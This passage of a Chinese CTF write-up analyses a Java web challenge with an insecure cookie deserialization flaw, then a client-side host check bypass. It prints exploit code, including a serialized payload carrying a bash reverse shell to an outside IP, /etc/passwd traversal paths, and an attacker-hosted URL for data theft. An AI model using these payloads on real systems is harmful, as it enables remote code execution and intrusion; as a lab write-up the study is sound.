</span></span><span style="display:flex;"><span>    String realPath <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getSession</span>().<span style="color:#a6e22e">getServletContext</span>().<span style="color:#a6e22e">getRealPath</span>(<span style="color:#e6db74">&#34;/WEB-INF/resource/&#34;</span>);
</span></span><span style="display:flex;"><span>    String path <span style="color:#f92672">=</span> realPath <span style="color:#f92672">+</span> originalFilename;
</span></span><span style="display:flex;"><span>    file.<span style="color:#a6e22e">transferTo</span>(<span style="color:#66d9ef">new</span> File(path));
</span></span><span style="display:flex;"><span>    request.<span style="color:#a6e22e">getSession</span>().<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;newpicfile&#34;</span>, path);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;uploadpic&#34;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>主要用于文件的读取和写入, 会去通过cookie校验身份.</p>
<p>ClientInfoFilter.class</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> WEB<span style="color:#f92672">-</span>INF.<span style="color:#a6e22e">classes</span>.<span style="color:#a6e22e">com</span>.<span style="color:#a6e22e">filters</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.tools.ClientInfo;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.tools.Tools;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.Filter;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.FilterChain;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.FilterConfig;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.ServletException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.ServletRequest;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.ServletResponse;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.Cookie;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletRequest;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletResponse;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ClentInfoFilter</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">implements</span> Filter {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>(FilterConfig fcg) {}
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doFilter</span>(ServletRequest request, ServletResponse response, FilterChain chain) <span style="color:#66d9ef">throws</span> IOException, ServletException {
</span></span><span style="display:flex;"><span>    Cookie<span style="color:#f92672">[]</span> cookies <span style="color:#f92672">=</span> ((HttpServletRequest)request).<span style="color:#a6e22e">getCookies</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">boolean</span> exist <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>    Cookie cookie <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (cookies <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (Cookie c : cookies) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (c.<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;cinfo&#34;</span>)) {
</span></span><span style="display:flex;"><span>          exist <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>          cookie <span style="color:#f92672">=</span> c;
</span></span><span style="display:flex;"><span>          
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>      } 
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (exist) {
</span></span><span style="display:flex;"><span>      String b64 <span style="color:#f92672">=</span> cookie.<span style="color:#a6e22e">getValue</span>();
</span></span><span style="display:flex;"><span>      Base64.<span style="color:#a6e22e">Decoder</span> decoder <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getDecoder</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> decoder.<span style="color:#a6e22e">decode</span>(b64);
</span></span><span style="display:flex;"><span>      ClientInfo cinfo <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (b64.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">||</span> bytes <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        cinfo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ClientInfo(<span style="color:#e6db74">&#34;Anonymous&#34;</span>, <span style="color:#e6db74">&#34;normal&#34;</span>, ((HttpServletRequest)request).<span style="color:#a6e22e">getRequestedSessionId</span>());
</span></span><span style="display:flex;"><span>        Base64.<span style="color:#a6e22e">Encoder</span> encoder <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getEncoder</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>          bytes <span style="color:#f92672">=</span> Tools.<span style="color:#a6e22e">create</span>(cinfo);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>          e.<span style="color:#a6e22e">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>        cookie.<span style="color:#a6e22e">setValue</span>(encoder.<span style="color:#a6e22e">encodeToString</span>(bytes));
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>          cinfo <span style="color:#f92672">=</span> (ClientInfo)Tools.<span style="color:#a6e22e">parse</span>(bytes);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>          e.<span style="color:#a6e22e">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>      } 
</span></span><span style="display:flex;"><span>      ((HttpServletRequest)request).<span style="color:#a6e22e">getSession</span>().<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;cinfo&#34;</span>, cinfo);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      Base64.<span style="color:#a6e22e">Encoder</span> encoder <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getEncoder</span>();
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        ClientInfo cinfo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ClientInfo(<span style="color:#e6db74">&#34;Anonymous&#34;</span>, <span style="color:#e6db74">&#34;normal&#34;</span>, ((HttpServletRequest)request).<span style="color:#a6e22e">getRequestedSessionId</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> Tools.<span style="color:#a6e22e">create</span>(cinfo);
</span></span><span style="display:flex;"><span>        cookie <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Cookie(<span style="color:#e6db74">&#34;cinfo&#34;</span>, encoder.<span style="color:#a6e22e">encodeToString</span>(bytes));
</span></span><span style="display:flex;"><span>        cookie.<span style="color:#a6e22e">setMaxAge</span>(86400);
</span></span><span style="display:flex;"><span>        ((HttpServletResponse)response).<span style="color:#a6e22e">addCookie</span>(cookie);
</span></span><span style="display:flex;"><span>        ((HttpServletRequest)request).<span style="color:#a6e22e">getSession</span>().<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;cinfo&#34;</span>, cinfo);
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        e.<span style="color:#a6e22e">printStackTrace</span>();
</span></span><span style="display:flex;"><span>      } 
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    chain.<span style="color:#a6e22e">doFilter</span>(request, response);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">destroy</span>() {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>控制cookie中cinfo项, 并通过cinfo来校验身份, 如果是第一次访问就会给你设置一个cinfo, 身份是Anonymous, 组别是normal</p>
<p>ClientInfo.class</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> WEB<span style="color:#f92672">-</span>INF.<span style="color:#a6e22e">classes</span>.<span style="color:#a6e22e">com</span>.<span style="color:#a6e22e">tools</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.tools.ClientInfo;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.Serializable;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ClientInfo</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">implements</span> Serializable {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">long</span> serialVersionUID <span style="color:#f92672">=</span> 1L;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> String name;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> String group;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> String id;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ClientInfo</span>(String name, String group, String id) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">group</span> <span style="color:#f92672">=</span> group;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> id;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getName</span>() { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span>; } 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getGroup</span>() { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">group</span>; }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getId</span>() { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">id</span>; }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>用于存储用户信息, 会被拿来序列化和base64之后作为cinfo的内容.</p>
<p>Tool.class</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> WEB<span style="color:#f92672">-</span>INF.<span style="color:#a6e22e">classes</span>.<span style="color:#a6e22e">com</span>.<span style="color:#a6e22e">tools</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Tools</span> <span style="color:#66d9ef">implements</span> Serializable {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">long</span> serialVersionUID <span style="color:#f92672">=</span> 1L;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">parse</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> ByteArrayInputStream(bytes));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ois.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> String testCall;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">create</span>(Object obj) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
</span></span><span style="display:flex;"><span>    ObjectOutputStream outputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
</span></span><span style="display:flex;"><span>    outputStream.<span style="color:#a6e22e">writeObject</span>(obj);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bos.<span style="color:#a6e22e">toByteArray</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(ObjectInputStream in) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>    Object obj <span style="color:#f92672">=</span> in.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">new</span> ProcessBuilder((String<span style="color:#f92672">[]</span>)obj)).<span style="color:#a6e22e">start</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Serializeable接口会去查看当前类中是否定义<code>writeObject</code> <code>readObject</code>如果有的话, 序列化和反序列化就用这两个方法来实现, 否则就用Serializeable 内置的接口去进行序列化反序列化的操作.</p>
<p>总结起来可能的点</p>
<ul>
<li>读文件</li>
<li>反序列化</li>
</ul>
<p>读文件首先要admin登录才行, 从源码中可以知道用户名用户组, 接下来写java来伪造cinfo.</p>
<p>创建java项目, 拷贝源码, 目录结构如下(由于序列化的时候会带进命名空间信息, 所以一定要对的上)</p>
<p><img loading="lazy" src="/images/image-20200301180703490.png" alt="image-20200301180703490"  />
</p>
<p>Main.java</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.tools.Tools;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.tools.ClientInfo;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Main</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            ClientInfo cinfo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ClientInfo(<span style="color:#e6db74">&#34;admin&#34;</span>, <span style="color:#e6db74">&#34;webmanager&#34;</span>, <span style="color:#e6db74">&#34;B18D77761C9C952BEDB6CDAC4205265B&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> Tools.<span style="color:#a6e22e">create</span>(cinfo);
</span></span><span style="display:flex;"><span>            Base64.<span style="color:#a6e22e">Encoder</span> encoder <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getEncoder</span>();
</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(encoder.<span style="color:#a6e22e">encodeToString</span>(bytes));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>伪造admin登录后尝试读文件, 这里有个疑惑的地方, 看源码文件读取的路径是直接和<code>/WEB-INF/resource/</code>拼接在一起的, 看赵师傅的wp中是靠<code>/../../etc/passwd</code>和它拼接之后可以读到文件, 这样的话路径就是<code>/WEB-INF/resource//../../etc/passwd</code>了, 然后我尝试不用/开头去拼接成<code>/WEB-INF/resource/../../../../../../etc/passwd</code>不管加多少个../都读不到对应的文件, 很是困惑. 然后读/../../flag显示没有权限.</p>
<p>写文件的功能114告诉我可以往../../../../../../../../tmp下面写, 具体多少个../我忘了&hellip;.但是没有文件包含的地方.</p>
<p>至此文件读取部分走不通了.</p>
<p>反序列化部分.</p>
<p>Tools.java中这段代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(ObjectInputStream in) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>        Object obj <span style="color:#f92672">=</span> in.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>        (<span style="color:#66d9ef">new</span> ProcessBuilder((String<span style="color:#f92672">[]</span>)obj)).<span style="color:#a6e22e">start</span>();
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>其中的ProcessBuilder是可以执行系统命令的.</p>
<p><a href="https://blog.csdn.net/wangmx1993328/article/details/80838768">https://blog.csdn.net/wangmx1993328/article/details/80838768</a></p>
<p>那可以考虑让反序列化的cinfo内容不是Clientinfo的序列化内容而是Tools的序列化内容.</p>
<p>将Tools.java中添加</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String testCall<span style="color:#f92672">[]</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String<span style="color:#f92672">[]</span> <span style="color:#a6e22e">getTestCall</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> testCall;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setTestCall</span>(String<span style="color:#f92672">[]</span> testCall) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">testCall</span> <span style="color:#f92672">=</span> testCall;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Main.java</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.tools.Tools;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.tools.ClientInfo;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Main</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            String<span style="color:#f92672">[]</span> cmd <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;bash -i&gt;&amp; /dev/tcp/174.0.220.248/9999 0&gt;&amp;1&#34;</span>};
</span></span><span style="display:flex;"><span>            Tools tools <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Tools();
</span></span><span style="display:flex;"><span>            tools.<span style="color:#a6e22e">setTestCall</span>(cmd);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> Tools.<span style="color:#a6e22e">create</span>(tools);
</span></span><span style="display:flex;"><span>            Base64.<span style="color:#a6e22e">Encoder</span> encoder <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getEncoder</span>();
</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(encoder.<span style="color:#a6e22e">encodeToString</span>(bytes));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>反弹shell</p>
<p>最后一步还是有些不明白的地方, 回头来看.</p>
<h2 id="2019-空指针ctf-公开赛">2019 空指针ctf 公开赛<a hidden class="anchor" aria-hidden="true" href="#2019-空指针ctf-公开赛">#</a></h2>
<p>hint页面要求是admin才能访问, 那么思路大概清楚了, 就是通过csrf让admin去访问hint然后把响应内容发送回来, 比赛的时候没看js代码就做题就是铁憨憨行为.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isProd</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">host</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;treasure.npointer.cn&#39;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadPage</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>) {
</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;#home&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.html&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//调试太麻烦了，日常测试放开限制
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isProd</span>()) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">url</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">url</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">result</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#content&#34;</span>).<span style="color:#a6e22e">html</span>(<span style="color:#a6e22e">result</span>);
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;hashchange&#39;</span>,<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">event</span>){
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">loadPage</span>();
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">loadPage</span>();
</span></span></code></pre></div><p>简单理解一下就是: 当锚点变化的时候, 就判断host, 如果host是<code>treasure.npointer.cn</code>就加载<code>treasure.npointer.cn加锚点加html的值</code>, 如果不是, 那么就直接加载锚点加上html的值, payload</p>
<pre tabindex="0"><code>http://treasure.npointer.cn./index.html#http://39.105.176.37:8000/bot
</code></pre><p>这里域名后面的<code>./</code>也是第一次见识, 他确实能访问到<code>treasure.npointer.cn</code>但是host名不再是<code>treasure.npointer.cn</code>了, 那么就可以绕过对主机名的判断直接请求锚点后面的值了.</p>
<p>这里有点坑, 其实是自己第一次接触太菜了.因为同源策略的影响, 服务端那边必须要设置<code>Access-Control-Allow-Origin=*</code>否则vps那边会拒绝跨域请求</p>
<p>使用以下脚本在同目录下执行开启python的服务器</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> http.server <span style="color:#f92672">import</span> HTTPServer, SimpleHTTPRequestHandler, test <span style="color:#66d9ef">as</span> test_orig
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span> (<span style="color:#f92672">*</span>args):
</span></span><span style="display:flex;"><span>        test_orig(<span style="color:#f92672">*</span>args, port<span style="color:#f92672">=</span>int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]) <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">8000</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">ImportError</span>: <span style="color:#75715e"># Python 2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> BaseHTTPServer <span style="color:#f92672">import</span> HTTPServer, test
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> SimpleHTTPServer <span style="color:#f92672">import</span> SimpleHTTPRequestHandler
</span></span><span style="display:flex;"><span>
